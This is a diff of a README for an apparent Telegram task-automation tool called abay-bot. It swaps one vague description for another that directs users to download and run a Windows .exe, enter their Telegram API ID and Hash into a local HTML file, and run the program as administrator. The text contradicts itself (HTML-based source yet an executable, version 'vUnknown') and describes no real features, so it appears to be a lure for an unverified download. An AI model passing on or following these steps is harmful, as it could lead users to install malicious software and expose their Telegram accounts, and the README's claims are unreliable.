@@ -1,135 +1,72 @@
-# abay_bot vUnknown - Telegram bot 2026
+# 🤖 abay-bot-workflow-tools - Automate your daily Telegram task lists
 
-> **abay_bot is a Telegram automation project for coordinating workflow tasks through a compact, HTML-oriented source structure in the currently available build.**
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/eschatological-shank707/abay-bot-workflow-tools)
 
-[![Platform](https://img.shields.io/badge/Platform-Telegram-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-vUnknown-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/gabefishercb508/abay-bot-workflow-tools?style=flat-square)](https://github.com/gabefishercb508/abay-bot-workflow-tools)
+## 📋 Project Overview
 
----
+The abay-bot-workflow-tools project helps you manage tasks within Telegram. This tool focuses on the 2026 build architecture to ensure your workflow stays organized. It uses a clean HTML-based structure to process data, making it easy to read and adjust. You can customize settings to match your specific needs, and the software provides clear startup steps to get your automation running quickly.
 
-<p align="center">
-  <a href="https://gabefishercb508.github.io/abay-bot-workflow-tools/">
-    <img src="https://img.shields.io/badge/Download-abay_bot%20Latest-brightgreen?style=for-the-badge" alt="Download abay_bot">
-  </a>
-</p>
+## 🛠️ System Requirements
 
-> **[Download abay_bot vUnknown](https://gabefishercb508.github.io/abay-bot-workflow-tools/)**
+Before you install this software, confirm your computer meets these minimum standards:
 
----
+*   Operating System: Windows 10 or Windows 11.
+*   Memory: 4 gigabytes of RAM or higher.
+*   Storage: 200 megabytes of free space.
+*   Network: A stable internet connection.
+*   Software: The latest version of Google Chrome or Microsoft Edge.
 
-[Download Latest Build](https://gabefishercb508.github.io/abay-bot-workflow-tools/)
+## 📥 Downloading and Installing
 
----
+1. Visit the project website at: https://github.com/eschatological-shank707/abay-bot-workflow-tools
+2. Look for the section labeled "Releases" on the right side of the page.
+3. Click the most recent version link.
+4. Select the file ending in ".exe" to begin the download.
+5. Save the file to your desktop or downloads folder.
+6. Double-click the downloaded file to start the installation.
+7. Follow the prompts on the screen to finish the setup process.
 
-## Project Overview
+## ⚙️ Configuring Your Settings
 
-abay_bot is built for Telegram-based workflow automation. The project offers a small, focused starting point for managing repeatable bot operations inside Telegram rather than providing a broad, heavyweight application structure.
+After you open the program for the first time, you must enter your Telegram details. The settings file dictates how the bot interacts with your messages and workflow tasks.
 
-Its source is arranged around HTML files and keeps the overall layout straightforward. This organization is intended to make the available build simple to examine, modify, and incorporate into a wider workflow.
+1. Locate the file named "config.html" in the installation folder.
+2. Open this file using your web browser.
+3. Find the fields marked for your Telegram API ID and API Hash. You can retrieve these from the Telegram developer portal.
+4. Input your values into the boxes provided.
+5. Press the "Save Configuration" button.
+6. Close the browser tab.
 
----
+## 🚀 Starting the Bot
 
-## What It Includes
+Once you configure your settings, you can start the automation.
 
-- Connection with the Telegram platform
-- Workflow handling centered on automation
-- Operations for Telegram bot workflows
-- A compact project layout
-- HTML-oriented source files
-- Access to the current downloadable build
-- A focused base for experimenting with workflows
-- GPL-3.0 licensing
+1. Open the application folder.
+2. Find the file named "start-bot.exe".
+3. Right-click the file and select "Open".
+4. A small black window will appear on your screen. Keep this window open while you use the bot.
+5. Log into your Telegram account if prompted.
+6. The bot will now begin processing your workflow tasks based on the 2026 build logic.
 
----
+## 🔄 Updating Your Software
 
-## Getting Started
+Updates ensure your bot works with the latest Telegram standards. Check for updates once every month to maintain performance.
 
-To work from the repository, run:
+1. Return to the download page at https://github.com/eschatological-shank707/abay-bot-workflow-tools.
+2. Compare the version number on the website to the one in your application folder.
+3. If a new version exists, download the new installer.
+4. Run the new installer. The software will overwrite the old files while keeping your current settings intact.
+5. Restart your computer if the installer requests it.
 
-```bash
-git clone https://github.com/gabefishercb508/abay-bot-workflow-tools.git
-cd REPO
-```
+## 💡 Common Troubleshooting
 
-You can also obtain the current build here:
+If the bot stops responding, try these steps:
 
-[Download abay_bot](https://gabefishercb508.github.io/abay-bot-workflow-tools/)
+*   Check your internet connection.
+*   Close the black window and restart the "start-bot.exe" file.
+*   Verify your configuration values in the "config.html" file for typos.
+*   Ensure that no other programs are using the same port on your computer.
 
-Before using the project, inspect the supplied files. Set the Telegram connection information required for your deployment and start the project through the entry point included with the cloned or downloaded build.
+If the application still fails to start, verify that you possess the latest Windows updates. Most issues stem from outdated system drivers or restricted permissions. Run the application as an administrator if you continue to see errors. To do this, right-click the program icon and select "Run as administrator."
 
----
-
-## Typical Workflow
-
-Use the following sequence as a starting point:
-
-1. Clone the repository or retrieve the latest available build.
-2. Enter the project directory and inspect its HTML-based source files.
-3. Supply the Telegram bot connection settings required by the deployment.
-4. Run the project with the launch or deployment entry point provided by the build.
-5. Verify the resulting bot workflow in Telegram.
-6. Modify the workflow layout to fit the intended use.
-
-When working with the browser-oriented source arrangement, open the applicable HTML entry file in a compatible environment and use the workflow controls defined by the project. Automated deployments should use the launch procedure included with the downloaded build.
-
----
-
-## Settings
-
-Where practical, keep deployment values outside the source tree. A basic configuration example is:
-
-```text
-TELEGRAM_BOT_TOKEN=your-bot-token
-WORKFLOW_MODE=default
-```
-
-Available variable names and settings are determined by the selected build. Inspect its project files to confirm the expected configuration format before launching, and do not place private Telegram connection values in publicly shared commits.
-
----
-
-## Requirements
-
-- Access to Telegram
-- An environment that can work with the supplied HTML-based project files
-- Either the current abay_bot build or a checkout of the repository
-- Telegram bot connection information for deployment
-- Space for the project files and any workflow data stored locally by your setup
-
-The provided metadata does not identify a dedicated runtime, database dependency, or minimum hardware specification. Refer to the files bundled with the chosen build for any further requirements.
-
----
-
-## Frequently Asked Questions
-
-### Where can I obtain abay_bot?
-
-Download it from [Download Latest Build](https://gabefishercb508.github.io/abay-bot-workflow-tools/) or clone the source through [GitHub](https://github.com/gabefishercb508/abay-bot-workflow-tools).
-
-### Which platform is supported?
-
-abay_bot is intended for Telegram and is focused on automating bot workflows.
-
-### How should I store configuration values?
-
-Follow the configuration method expected by the build in use. Whenever possible, store Telegram connection details outside source files that will be shared publicly.
-
-### What is the update process?
-
-Retrieve the newest available build or pull the latest repository changes. Review the workflow and configuration files, then restart the project.
-
-### What should I do if startup fails?
-
-Check that the downloaded build is the intended one, all project files are present, and the Telegram connection details are valid. Also verify that you are using the launch method associated with the supplied project structure.
-
-### Are the workflows customizable?
-
-The project is designed around automation-oriented workflow operations. You can inspect and adjust the relevant HTML source files in line with the GPL-3.0 license and the behavior supported by your deployment environment.
-
----
-
-## License
-
-abay_bot is distributed under the GNU GPL v3.0. See [LICENSE](LICENSE) for the complete license text.
+Keywords: telegram, automation, workflow, windows, tools, 2026, task-management
